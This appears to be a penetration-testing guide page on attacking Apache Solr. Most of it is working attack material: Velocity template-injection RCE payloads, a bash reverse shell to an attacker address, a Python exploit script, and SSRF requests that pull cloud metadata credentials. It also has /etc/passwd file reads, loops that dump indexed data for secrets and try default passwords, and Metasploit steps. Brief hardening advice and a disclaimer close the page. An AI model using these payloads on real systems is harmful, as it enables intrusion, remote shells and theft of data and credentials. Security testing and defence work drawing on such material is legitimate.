---
title: "Apache Solr"
date: 2026-02-24
draft: false
---

## Overview

Apache Solr is an open-source enterprise search platform built on Apache Lucene. It is commonly exposed internally and occasionally externally in corporate environments, cloud deployments, and data pipelines. Its rich HTTP API and Java internals make it a high-value target: unauthenticated admin panels, multiple deserialization vectors, SSRF handlers, and template injection have all led to full server compromise.

**Default Ports:**
| Port | Service |
|------|---------|
| 8983 | Solr HTTP API / Admin UI |
| 9983 | Solr inter-node communication (SolrCloud) |
| 2181 | ZooKeeper (embedded SolrCloud) |

---

## Recon and Fingerprinting

### Service Detection

```bash
nmap -sV -p 8983,9983 TARGET_IP
nmap -sV -p 8983 --script http-title,http-headers TARGET_IP
```

### Admin Panel Access

The Solr Admin UI is located at:

```
http://TARGET_IP:8983/solr/
http://TARGET_IP:8983/solr/admin/
http://TARGET_IP:8983/solr/#/
```

If unauthenticated access is available, you can:

- List all cores/collections
- View schema and configuration
- Run queries against all indexed data
- Modify configuration files
- Trigger DataImportHandler

### Core/Collection Enumeration

```bash
# List all cores
curl -s http://TARGET_IP:8983/solr/admin/cores?action=STATUS | python3 -m json.tool

# List collections (SolrCloud)
curl -s http://TARGET_IP:8983/solr/admin/collections?action=LIST | python3 -m json.tool

# Get schema for a core
curl -s http://TARGET_IP:8983/solr/CORENAME/schema | python3 -m json.tool

# Query all documents
curl -s "http://TARGET_IP:8983/solr/CORENAME/select?q=*:*&wt=json&rows=100"
```

### Version Detection

```bash
curl -s http://TARGET_IP:8983/solr/admin/info/system | python3 -m json.tool | grep -i version
```

---

## CVE-2019-0192 — Deserialization RCE via Config API

**CVSS:** 9.8 Critical
**Affected:** Solr 5.0.0 to 5.5.5, 6.0.0 to 6.6.5
**Type:** Java deserialization via JMX endpoint

### Vulnerability Details

Solr's Config API allowed configuring a JMX server via the `jmx` section. By pointing Solr at an attacker-controlled RMI endpoint, a malicious serialized Java object could be delivered and executed when Solr connected to "set" the JMX config. This is a classic deserialization gadget chain exploitation path.

The `UpdateRequestProcessorChain` configuration also exposed a deserialization vector via the `StatelessScriptUpdateProcessorFactory`.

### Attack Flow

```bash
# Step 1: Stand up a malicious RMI server using ysoserial
# On attacker machine:
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit YOUR_IP 1099 CommonsCollections1 "id > /tmp/pwned"

# Step 2: Configure Solr to connect to your JMX endpoint
curl -s "http://TARGET_IP:8983/solr/CORENAME/config" -H 'Content-type:application/json' \
  -d '{"set-property":{"jmx":{"agentId":"","serviceUrl":"service:jmx:rmi:///jndi/rmi://YOUR_IP:1099/exploit"}}}'
```

### Alternative — RemoteStreaming Deserialization

```bash
# Enable RemoteStreaming (needed for some Solr versions)
curl http://TARGET_IP:8983/solr/CORENAME/config -H 'Content-type:application/json' \
  -d '{"set-property":{"requestDispatcher":{"requestParsers":{"enableRemoteStreaming":true}}}}'

# Trigger deserialization
curl "http://TARGET_IP:8983/solr/CORENAME/update?commit=true" \
  -H 'Content-type:application/json' \
  -d '[{"id":"1","name":"test"}]'
```

---

## CVE-2019-17558 — Velocity Template Injection RCE

**CVSS:** 8.1 High
**Affected:** Solr 5.0.0 to 8.3.1
**Type:** Server-Side Template Injection (SSTI) via Velocity engine
**References:** Multiple public PoCs exist

### Vulnerability Details

Apache Solr included the Velocity response writer (`wt=velocity`) which by default was disabled but could be enabled via the Config API without authentication. Once enabled, the `v.template` and `v.layout` parameters allowed injecting Velocity Template Language (VTL) expressions, leading to arbitrary command execution.

The critical path:
1. Enable the Velocity response writer via the Config API
2. Pass a Velocity template containing a runtime exec call

### File Read PoC

```bash
# Step 1: Enable Velocity response writer
curl -s "http://TARGET_IP:8983/solr/CORENAME/config" \
  -H "Content-Type: application/json" \
  -d '{
    "update-queryresponsewriter": {
      "startup": "lazy",
      "name": "velocity",
      "class": "solr.VelocityResponseWriter",
      "template.base.dir": "",
      "solr.resource.loader.enabled": "true",
      "params.resource.loader.enabled": "true"
    }
  }'

# Step 2: Read /etc/passwd via Velocity template
curl -s "http://TARGET_IP:8983/solr/CORENAME/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set(%24x%3D%27%27)%23set(%24rt%3D%24x.class.forName(%27java.lang.Runtime%27))%23set(%24chr%3D%24x.class.forName(%27java.lang.Character%27))%23set(%24str%3D%24x.class.forName(%27java.lang.String%27))%23set(%24ex%3D%24rt.getRuntime().exec(%27cat%20/etc/passwd%27))%23set(%24exin%3D%24ex.getInputStream())%23set(%24inr%3D%24x.class.forName(%27java.io.InputStreamReader%27).getDeclaredConstructors().get(0))%23set(%24inr2%3D%24inr.newInstance(%24exin))%23set(%24br%3D%24x.class.forName(%27java.io.BufferedReader%27).getDeclaredConstructors().get(0))%23set(%24br2%3D%24br.newInstance(%24inr2))%23set(%24lines%3D%24br2.readLine())%24lines"
```

### RCE PoC — Reverse Shell

```bash
# URL-encoded Velocity template for reverse shell
# Template (decoded):
# #set($x='')
# #set($rt=$x.class.forName('java.lang.Runtime'))
# #set($ex=$rt.getRuntime().exec('bash -c {echo,BASE64_ENCODED_CMD}|{base64,-d}|bash'))

# Encode your command
CMD='bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
B64=$(echo -n "$CMD" | base64 -w0)

# Build the template
python3 -c "
import urllib.parse
template = '''#set(\$x='')#set(\$rt=\$x.class.forName('java.lang.Runtime'))#set(\$ex=\$rt.getRuntime().exec(['bash','-c','bash -i >& /dev/tcp/YOUR_IP/4444 0>&1']))#set(\$exin=\$ex.getInputStream())#set(\$inr=\$x.class.forName('java.io.InputStreamReader').getDeclaredConstructors().get(0))#set(\$inr2=\$inr.newInstance(\$exin))#set(\$br=\$x.class.forName('java.io.BufferedReader').getDeclaredConstructors().get(0))#set(\$br2=\$br.newInstance(\$inr2))#set(\$lines=\$br2.readLine())\$lines'''
print(urllib.parse.quote(template))
"

# Execute (replace ENCODED_TEMPLATE with output above)
curl -s "http://TARGET_IP:8983/solr/CORENAME/select?q=1&wt=velocity&v.template=custom&v.template.custom=ENCODED_TEMPLATE"
```

### Python Exploit Script

```python
import requests
import sys
import urllib.parse

TARGET = "http://TARGET_IP:8983"
CORE = "CORENAME"
LHOST = "YOUR_IP"
LPORT = "4444"

def enable_velocity(session, target, core):
    url = f"{target}/solr/{core}/config"
    data = {
        "update-queryresponsewriter": {
            "startup": "lazy",
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "template.base.dir": "",
            "solr.resource.loader.enabled": "true",
            "params.resource.loader.enabled": "true"
        }
    }
    r = session.post(url, json=data)
    print(f"[*] Enable Velocity: {r.status_code}")
    return r.status_code == 200

def rce(session, target, core, cmd):
    template = (
        f"#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))"
        f"#set($ex=$rt.getRuntime().exec('{cmd}'))"
        f"#set($exin=$ex.getInputStream())"
        f"#set($inr=$x.class.forName('java.io.InputStreamReader').getDeclaredConstructors().get(0))"
        f"#set($inr2=$inr.newInstance($exin))"
        f"#set($br=$x.class.forName('java.io.BufferedReader').getDeclaredConstructors().get(0))"
        f"#set($br2=$br.newInstance($inr2))"
        f"#set($lines=$br2.readLine())$lines"
    )
    encoded = urllib.parse.quote(template)
    url = f"{target}/solr/{core}/select?q=1&wt=velocity&v.template=custom&v.template.custom={encoded}"
    r = session.get(url)
    return r.text

s = requests.Session()
if enable_velocity(s, TARGET, CORE):
    print("[+] Velocity enabled — running command")
    print(rce(s, TARGET, CORE, "id"))
```

---

## CVE-2021-27905 — SSRF via Replication Handler

**CVSS:** 7.2 High
**Affected:** Solr 7.0.0 to 8.8.1
**Type:** Server-Side Request Forgery
**CWE:** CWE-918

### Vulnerability Details

The Solr replication handler (`/replication`) allowed replication from a remote master. The `masterUrl` parameter could be set to an arbitrary URL, causing the Solr server to make outbound HTTP requests. This enabled:

- Internal network scanning
- Access to cloud metadata endpoints (AWS EC2 metadata, GCP metadata)
- Exfiltrating credentials from internal services

### SSRF PoC

```bash
# Probe internal network
curl "http://TARGET_IP:8983/solr/CORENAME/replication?command=fetchindex&masterUrl=http://192.168.1.1:8080/test&wt=json"

# AWS metadata exfiltration
curl "http://TARGET_IP:8983/solr/CORENAME/replication?command=fetchindex&masterUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/&wt=json"

# GCP metadata
curl "http://TARGET_IP:8983/solr/CORENAME/replication?command=fetchindex&masterUrl=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token&wt=json"

# Internal service scan via response timing
for port in 22 80 443 3306 5432 6379 9200; do
  echo -n "Port $port: "
  curl -s -o /dev/null -w "%{time_total}s %{http_code}" \
    "http://TARGET_IP:8983/solr/CORENAME/replication?command=fetchindex&masterUrl=http://192.168.1.1:$port/&wt=json"
  echo
done
```

---

## CVE-2023-50386 — Backup/Restore RCE

**CVSS:** 8.8 High
**Affected:** Solr 6.0.0 to 9.4.0
**Type:** Path traversal leading to arbitrary file write / code execution
**CWE:** CWE-22

### Vulnerability Details

Solr's Backup API allowed specifying a `location` parameter for where backups should be stored. Insufficient validation of this parameter allowed path traversal, enabling an attacker to write files to arbitrary locations on the filesystem. Combined with Solr's Config API, this could lead to RCE by writing a malicious script to a predictable path and triggering execution.

### PoC — File Write via Backup

```bash
# Create a collection/core snapshot and write to /tmp
curl "http://TARGET_IP:8983/solr/CORENAME/replication?command=backup&location=/tmp/evil_backup&name=test&wt=json"

# Path traversal attempt — write outside Solr data dir
curl "http://TARGET_IP:8983/solr/CORENAME/replication?command=backup&location=../../../tmp/traversal_test&name=test&wt=json"

# Restore from attacker-controlled location
curl "http://TARGET_IP:8983/solr/CORENAME/replication?command=restore&name=snapshot.TIMESTAMP&location=/tmp/evil_backup&wt=json"
```

---

## DataImportHandler (DIH) — SSRF and RCE

The DataImportHandler is a powerful Solr plugin that can import data from databases, HTTP endpoints, and the filesystem. When exposed without authentication, it is a significant attack surface.

### Checking if DIH is Enabled

```bash
curl -s "http://TARGET_IP:8983/solr/CORENAME/dataimport?command=status&wt=json"
```

### SSRF via DIH Configuration

```bash
# Submit a custom data-config.xml via the debug endpoint
curl -s "http://TARGET_IP:8983/solr/CORENAME/dataimport?command=full-import&debug=true&clean=false&verbose=true" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'dataConfig=<dataConfig>
  <dataSource type="URLDataSource"/>
  <document>
    <entity name="test" url="http://169.254.169.254/latest/meta-data/" transformer="HTMLStripTransformer">
      <field column="content" xpath="/"/>
    </entity>
  </document>
</dataConfig>'
```

### RCE via DIH Script Transformer

```bash
curl -s "http://TARGET_IP:8983/solr/CORENAME/dataimport?command=full-import&debug=true" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'dataConfig=<dataConfig>
  <dataSource type="URLDataSource"/>
  <document>
    <entity name="test" url="http://127.0.0.1/non-existent"
            transformer="script:test">
    </entity>
  </document>
  <script><![CDATA[
    function test(row) {
      var runtime = java.lang.Runtime.getRuntime();
      var process = runtime.exec("id");
      var is = process.getInputStream();
      var reader = new java.io.BufferedReader(new java.io.InputStreamReader(is));
      var line = reader.readLine();
      row.put("result", line);
      return row;
    }
  ]]></script>
</dataConfig>'
```

---

## Admin Panel Exposure — Unauthenticated Access

By default, Solr has no authentication. All administrative operations are available to anyone who can reach port 8983.

### Sensitive Endpoints

```bash
# System information
curl http://TARGET_IP:8983/solr/admin/info/system

# Thread dump — reveals internal class paths and threads
curl http://TARGET_IP:8983/solr/admin/info/threads

# Logging configuration
curl http://TARGET_IP:8983/solr/admin/info/logging

# Properties — can expose file paths, Java properties, env
curl http://TARGET_IP:8983/solr/admin/info/properties

# File system info
curl http://TARGET_IP:8983/solr/admin/info/commandlineargs

# Metrics
curl http://TARGET_IP:8983/solr/admin/metrics

# Collections API
curl "http://TARGET_IP:8983/solr/admin/collections?action=LIST&wt=json"

# Config sets
curl "http://TARGET_IP:8983/solr/admin/configs?action=LIST&wt=json"
```

### Query All Data from a Core

```bash
# Dump all indexed documents
curl "http://TARGET_IP:8983/solr/CORENAME/select?q=*:*&wt=json&rows=1000&start=0" | python3 -m json.tool

# Search for sensitive terms
for term in password passwd credential secret token apikey email ssn; do
  echo "=== Searching: $term ==="
  curl -s "http://TARGET_IP:8983/solr/CORENAME/select?q=$term&wt=json&rows=10"
done

# Get total document count
curl -s "http://TARGET_IP:8983/solr/CORENAME/select?q=*:*&wt=json&rows=0" | python3 -c "import sys,json; d=json.load(sys.stdin); print('Total docs:', d['response']['numFound'])"
```

---

## Authentication Bypass and Weak Auth

### Basic Auth Brute Force (if enabled)

```bash
# Check if BasicAuth plugin is in use
curl -v http://TARGET_IP:8983/solr/ 2>&1 | grep -i "WWW-Authenticate\|401"

# Attempt default credentials
for cred in "solr:SolrRocks" "admin:admin" "solr:solr" "admin:password"; do
  user=$(echo $cred | cut -d: -f1)
  pass=$(echo $cred | cut -d: -f2)
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$pass" http://TARGET_IP:8983/solr/admin/cores)
  echo "$cred -> $CODE"
done
```

### Kerberos/JWT Bypass Attempts

```bash
# Some deployments use JWT — try without token
curl -H "Authorization: Bearer " http://TARGET_IP:8983/solr/admin/cores

# Null byte in auth header
curl -H $'Authorization: Bearer \x00' http://TARGET_IP:8983/solr/admin/cores
```

---

## Nuclei Templates

### Apache Solr Local File Inclusion — CVE Template

The following nuclei template detects Apache Solr LFI via the `debug/dump` endpoint with the `stream.url` parameter. It works in three steps: first it discovers available core names by querying the admin API and extracting core names from the JSON response using a regex extractor, then it uses those extracted core names to probe the LFI endpoint on both Windows (`win.ini`) and Linux (`/etc/passwd`).

The `stream.url=file:///` parameter instructs Solr to stream file contents as if they were a remote data source. When `RemoteStreaming` is enabled (or when Solr's security model does not restrict this parameter), the file content is returned in the HTTP response body.

```yaml
id: apache-solr-file-read

info:
  name: Apache Solr <=8.8.1 - Local File Inclusion
  author: DhiyaneshDk,philippedelteil
  severity: high
  description: Apache Solr versions prior to and including 8.8.1 are vulnerable to local file inclusion via the debug/dump endpoint with stream.url parameter.
  reference:
    - https://nsfocusglobal.com/apache-solr-arbitrary-file-read-and-ssrf-vulnerability-threat-alert/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  metadata:
    max-request: 3
  tags: apache,solr,lfi,vuln

http:
  - raw:
      - |
        GET /solr/admin/cores?wt=json HTTP/1.1
        Host: {{Hostname}}
        Accept-Language: en
        Connection: close
      - |
        GET /solr/{{core}}/debug/dump?stream.url=file:///../../../../../Windows/win.ini&param=ContentStream HTTP/1.1
        Host: {{Hostname}}
        Accept-Language: en
        Connection: close
      - |
        GET /solr/{{core}}/debug/dump?stream.url=file:///etc/passwd&param=ContentStream HTTP/1.1
        Host: {{Hostname}}
        Accept-Language: en
        Connection: close

    extractors:
      - type: regex
        name: core
        internal: true
        group: 1
        regex:
          - '"name":"([a-zA-Z0-9_-]+)"'
```

**How this template works, step by step:**

1. **Request 1** (`GET /solr/admin/cores?wt=json`): Queries the Solr admin API to retrieve the list of configured cores in JSON format. Without a core name, the LFI endpoint cannot be targeted.

2. **Extractor** (`type: regex, name: core, internal: true`): Parses the JSON response from step 1 using a regex to extract the first core name matching `"name":"<value>"`. The `internal: true` flag means the extracted value is used within the template itself (as the `{{core}}` variable in subsequent requests) rather than being reported directly.

3. **Request 2** (`debug/dump?stream.url=file:///../../../../../Windows/win.ini`): Targets Windows Solr instances by attempting to read `win.ini` via path traversal. The `param=ContentStream` tells Solr to use the `stream.url` parameter as the data source.

4. **Request 3** (`debug/dump?stream.url=file:///etc/passwd`): Targets Linux/Unix Solr instances by reading `/etc/passwd` directly.

```bash
# Run this template against a target
nuclei -u http://TARGET_IP:8983 -t apache-solr-file-read.yaml -v

# Save to file first
cat > /tmp/apache-solr-file-read.yaml << 'TEMPLATE'
# (paste template content above)
TEMPLATE

nuclei -u http://TARGET_IP:8983 -t /tmp/apache-solr-file-read.yaml
```

### Existing Nuclei Templates

```yaml
# Solr admin panel detection
id: solr-admin-panel
info:
  name: Apache Solr Admin Panel
  severity: medium
  tags: apache,solr,panel

requests:
  - method: GET
    path:
      - "{{BaseURL}}/solr/"
      - "{{BaseURL}}/solr/admin/"
    matchers:
      - type: word
        words:
          - "Solr Admin"
          - "solr-admin"
        condition: or

---

# CVE-2019-17558 Velocity SSTI
id: CVE-2019-17558
info:
  name: Apache Solr Velocity SSTI RCE
  severity: critical
  reference: https://nvd.nist.gov/vuln/detail/CVE-2019-17558

requests:
  - method: GET
    path:
      - "{{BaseURL}}/solr/{{core}}/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set(%24x%3D%27%27)%23set(%24rt%3D%24x.class.forName(%27java.lang.Runtime%27))%23set(%24ex%3D%24rt.getRuntime().exec(%27id%27))%23set(%24exin%3D%24ex.getInputStream())%23set(%24inr%3D%24x.class.forName(%27java.io.InputStreamReader%27).getDeclaredConstructors().get(0))%23set(%24inr2%3D%24inr.newInstance(%24exin))%23set(%24br%3D%24x.class.forName(%27java.io.BufferedReader%27).getDeclaredConstructors().get(0))%23set(%24br2%3D%24br.newInstance(%24inr2))%23set(%24lines%3D%24br2.readLine())%24lines"
    matchers:
      - type: regex
        regex:
          - "uid=[0-9]+.*gid=[0-9]+"
```

---

## Tools

| Tool | Usage |
|------|-------|
| `solr-injection` | Solr injection scanner |
| `nuclei` | CVE templates for Solr |
| `curl` | Manual API interaction |
| `ysoserial` | Java deserialization payloads |
| `jython` | DIH script execution testing |
| `ffuf` | Core/collection enumeration |
| `metasploit` | `exploit/multi/http/solr_velocity_rce` |

### Metasploit Module

```bash
msfconsole -q
use exploit/multi/http/solr_velocity_rce
set RHOSTS TARGET_IP
set RPORT 8983
set TARGET_URI /solr/CORENAME
set LHOST YOUR_IP
run
```

---

## Full Attack Chain Summary

```
1. Discover Solr on port 8983
   └─ nmap / curl admin endpoint

2. Enumerate cores
   └─ /solr/admin/cores?action=STATUS

3. Check Solr version
   └─ /solr/admin/info/system

4. If Solr <= 8.3.1:
   └─ CVE-2019-17558 Velocity RCE
      a. Enable Velocity writer via Config API
      b. Inject Velocity template with Runtime.exec()
      c. Catch reverse shell

5. If DataImportHandler exposed:
   └─ DIH Script Transformer RCE

6. If replication handler exposed:
   └─ CVE-2021-27905 SSRF → internal recon

7. Dump all indexed data
   └─ /solr/CORENAME/select?q=*:*
```

---

## Hardening Recommendations

- Enable Solr authentication (BasicAuthPlugin or Kerberos)
- Restrict network access — Solr should never be internet-facing
- Disable DataImportHandler if not needed
- Disable Velocity response writer: remove from solrconfig.xml
- Use Solr's Rule-Based Authorization plugin
- Deploy behind a reverse proxy with IP whitelisting
- Upgrade to latest Solr version (9.x series)
- Enable TLS for all Solr communication


---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.